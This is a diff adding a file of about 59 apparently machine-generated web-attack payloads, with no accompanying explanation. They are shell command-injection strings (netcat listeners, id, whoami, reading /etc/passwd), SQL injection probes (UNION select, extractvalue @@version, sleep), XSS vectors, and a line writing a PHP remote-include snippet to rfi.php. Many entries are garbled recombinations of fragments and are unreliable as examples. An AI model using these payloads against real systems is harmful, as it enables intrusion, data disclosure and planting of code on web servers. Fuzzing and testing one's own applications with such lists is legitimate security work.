@@ -1,0 +1,59 @@
+&& nc -lvp 666 ('whoami') &&
+xDd3') or 'x'='x UnIoN select 1,’09ac5d’ #
+<textarea alert('XSS') </script>
+|| ipconfig /usr/bin/id &&
+eETd” AND 1=0 extractvalue(1,select @@version) --
+<img src= alert('XSS') >
+|| nc -lvp 666 |id| %0a%0d
+eETd” AND 1=0 extractvalue(1,select @@version) /*
+</script> alert(1) </script>
+|| dir C:\Users %0a%0d
+xDd3') or 'x'='x  /*
+</script> alert('XSS') >
+%0a%0d exec <?php include($_GET['page']); ?>" > rfi.php %0a%0d
+1’ or 2>1 UnIoN select 1,’09ac5d’ --
+<img src= alert(1) </script>
+&& curl ('whoami')
+<img src= alert('XSS') </script>
+|| eval localhost a
+eETd” or 2>1 extractvalue(1,select @@version) #
+<img src= alert('XSS') </script>
+%0a%0d eval |id| a
+1’ AND 1=0 extractvalue(1,select @@version) #
+</script> alert(1) >
+&& ping /etc/passwd ||
+xDd3') AND 1=0 extractvalue(1,select @@version) /*
+</script> alert('XSS') </script>
+|| ipconfig /etc/passwd & 
+xDd3') or 2>1 UnIoN select 1,’09ac5d’ /*
+<scr alert('XSS') >
+a eval onerror=”| /usr/bin/id” &&
+1’ AND 1=0 extractvalue(1,select @@version) --
+<img src= alert(String.fromCharCode(88,83,83)) </script>
+|| ipconfig onerror=”| ('pwd')” ||
+eETd” AND 1=0  #
+<script>alert('XSS')</script>
+<img src= alert(1) >
+&  exec /usr/bin/id ||
+1’ or 'x'='x UNION select sleep(1) /*
+<svg/onload= alert(String.fromCharCode(88,83,83)) >
+a ls |id| &&
+1’ or 2>1 UNION select sleep(1) --
+<scr alert(String.fromCharCode(88,83,83)) >
+%0a%0d curl ('whoami') &&
+eETd” or 2>1 UNION select sleep(1) #
+<svg/onload= alert(String.fromCharCode(88,83,83)) </script>
+a cat /usr/bin/id &&
+1’ AND 1=0 extractvalue(1,select @@version) #
+</script> alert(String.fromCharCode(88,83,83)) </script>
+ ls /etc/hosts &&
+1’ or 2>1 UNION select sleep(1) #
+<scr alert(1) </script>
+ eval ('pwd') a
+eETd” AND 1=0 extractvalue(1,select @@version) #
+<scr alert(1) </script>
+&& eval ('ls') 
+eETd” or 2>1  /*
+ curl ('ls') 
+xDd3') AND 1=0 UnIoN select 1,’09ac5d’ #
+<textarea alert('XSS') >
